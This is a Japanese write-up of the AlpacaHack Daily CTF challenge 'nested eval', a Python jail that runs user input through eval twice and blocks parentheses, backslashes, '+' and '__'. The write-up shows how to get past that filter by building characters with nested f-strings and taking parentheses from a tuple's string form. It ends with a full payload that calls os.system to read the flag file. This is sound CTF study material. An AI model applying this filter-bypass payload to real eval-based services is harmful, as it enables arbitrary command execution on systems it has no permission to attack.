---
title: "nested eval - AlpacaHack Daily"
category: "misc"
subcategory: "misc"
type: "writeup"
tags: ["misc", "alpacahack", "eval", "nested", "miscellaneous", "nested-eval"]
summary: "misc writeup for \"nested eval\" from AlpacaHack Daily - techniques: alpacahack, eval, nested, miscellaneous, nested-eval."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202609/d19-21_nested_eval/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "nested eval"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** nested eval
- **Date:** 2026-09-19-21
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202609/d19-21_nested_eval>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202609/d19-21_nested_eval/README.md>

---
# nested eval

難しい問題でしたが、解けたときはかなり爽快でした。

## 問題

二重に eval してあげる!

```py
code = input("jail> ")
assert code.isascii(), "Not allowed"

prohibited = ["(", ")", "\\", "+", "__"]
assert not any(p in code for p in prohibited), "Not allowed"

eval(f"eval({code})")
```

## 概要

入力文字列をevalに渡す文字列をさらにevalに渡し、二重にevalしてくれるようです。

イメージとしてはだいたいこんな感じですね。
```
入力: "print('hello jail')"
eval(f"eval({code})") -> eval("print('hello jail')") -> print('hello jail')
出力: hello jail
```
しかし困ったことに、入力に非ASCII文字や`(`, `)`, `\`, `+`, `__`が含まれていると弾かれてしまいます。

Dockerfileを見ると、フラグは`/flag-<MD5ハッシュ値>.txt`に置かれているようですが、どうすれば取得できるのでしょうか？

## 方針

内側のevalにf文字列を渡すことで入力チェックを回避する。

## 解法

まず、大前提として意識しなければいけないのは、evalに渡すのはコードそのものではなくコードを表す文字列だということです。

なので、概要で例示したとおり、内側のevalに渡すものは文字列として解釈できる文字列でなければいけません。

しかし、文字列として解釈できるものであればいいので、f文字列であっても許されます。

さて、この問題の目標は外側のevalで下記のコードを実行することです。
```
"__import__('os').system('cat /flag*')"
```

しかし、これをそのまま入力すると文字列チェックで弾かれてしまいます。

なんとか`__`, `(`, `)`の制約を回避したいところですが、`\`も使えないので単純なエスケープによる回避は許されません。

### `__`を回避する

まず、連続するアンダースコア`__`は弾かれますが、単体のアンダースコア`_`は弾かれません。

ここで前述のとおりf文字列を利用します。
```
f"{'_'}_import{'_'}_('os').system('cat /flag*')"
```
こうすると、外側のevalに渡される文字列が
```
"__import__('os').system('cat /flag*')"
```
になるので、`__`を入力には含めず渡すことができます。

### `(`, `)`を回避する

ここがすごい悩みどころでした。

`{chr(0x28)}`としようにも"("は必要になってしまいます。

なんとかして"("を使わずにどこかから借りてくることはできないでしょうか？

しばらく考えて、タプルを利用することを思いつきました。

```py
print(f"{f'{1,2}'}")
```
```
(1, 2)
```

`(`がでてきました！

欲しいのはこの先頭の文字と末尾の文字なので、

```py
print(f"left parenthesis: {f'{1,2}'[0]}")
print(f"right parenthesis: {f'{1,2}'[-1]}")
```
```
left parenthesis: (
right parenthesis: )
```

これで`(`, `)`を回避することができるようになりました。

あとはこれを使って先ほどのづつきを完成させると、
```
f"{'_'}_import{'_'}_{f'{1,2}'[0]}'os'{f'{1,2}'[-1]}.system{f'{1,2}'[0]}'cat /flag*'{f'{1,2}'[-1]}"
```
のようになります。
